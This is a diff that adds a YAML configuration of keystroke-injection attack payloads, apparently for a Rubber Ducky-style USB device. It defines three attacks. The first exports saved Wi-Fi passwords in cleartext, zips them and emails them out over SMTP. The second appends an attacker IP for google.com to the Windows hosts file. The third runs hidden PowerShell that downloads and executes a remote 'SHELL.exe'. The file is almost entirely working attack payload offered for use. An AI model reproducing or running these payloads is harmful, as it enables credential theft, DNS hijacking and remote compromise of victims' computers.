@@ -1,0 +1,93 @@
+
+Server_Settings:
+  address: "192.168.100.50"
+  port: 2290
+
+attack_1:
+  name: Wifi Password Dump and Send via Email
+  payload:
+    - press_key: 131  # Left Windows Key
+    - type: run
+    - press_key: 176 # Return
+    - delay: 500
+    - type: cmd
+    - delay: 500
+    - press_key: 176
+    - delay: 700
+    - type: netsh wlan export profile key=clear > ./null
+    - press_key: 176
+    - delay: 750
+    - type: mkdir temp
+    - press_key: 176
+    - type: xcopy *.xml temp
+    - press_key: 176
+    - delay: 750
+    - type: poweshell
+    - press_key: 176
+    - type: Compress-Archive -Path ./temp/* -DestinationPath ./temp.zip
+    - press_key: 176
+    - delay: 700
+    - type: $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+    - press_key: 176
+    - delay: 700
+    - type: $SMTPInfo.EnableSsl = $true
+    - press_key: 176
+    - delay: 700
+    - type: $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL@GMAIL','GMAIL@PASS');
+    - press_key: 176
+    - delay: 700
+    - type: $ReportEmail = New-Object System.Net.Mail.MailMessage
+    - press_key: 176
+    - delay: 700
+    - type: $ReportEmail.From = 'GMAIL@GMAIL'
+    - press_key: 176
+    - delay: 700
+    - type: $ReportEmail.To.Add('GMAIL@GMAIL')
+    - press_key: 176
+    - delay: 700
+    - type: $ReportEmail.Subject = 'Rubber Ducky Executed'
+    - press_key: 176
+    - delay: 700
+    - type: $ReportEmail.Attachments.Add('./temp.zip')
+    - press_key: 176
+    - delay: 700
+    - type: $SMTPInfo.Send($ReportEmail)
+    - press_key: 176
+    - delay: 700
+    - type: exit
+    - press_key: 176
+
+attack_2:
+  name: Poison DNS
+  payload:
+    - press_key: 131  # Left Windows Key
+    - type: run
+    - press_key: 176 # Return
+    - delay: 500
+    - type: cmd
+    - delay: 500
+    - press_key: 128
+    - press_key: 129
+    - press_key: 176 # Return
+    - delay: 500
+    - press_key: 216
+    - delay: 1000
+    - type: ECHO <ATTACKIP> google.com >> C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS
+    - press_key: 176 # Return
+    - type: exit
+    - press_key: 176
+
+attack_3:
+  name: Remote Shell
+  payload:
+    - press_key: 131  # Left Windows Key
+    - type: run
+    - press_key: 176 # Return
+    - delay: 500
+    - type: cmd
+    - delay: 500
+    - press_key: 176 # Return
+    - type: powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('WEBSERVER/SHELL.exe',\\\"$env:temp\\win_x86.exe\\\"); Start-Process \\\"$env:temp\\win_x86.exe\\\"\"
+    - press_key: 176 # Return
+    - type: exit
+    - press_key: 176
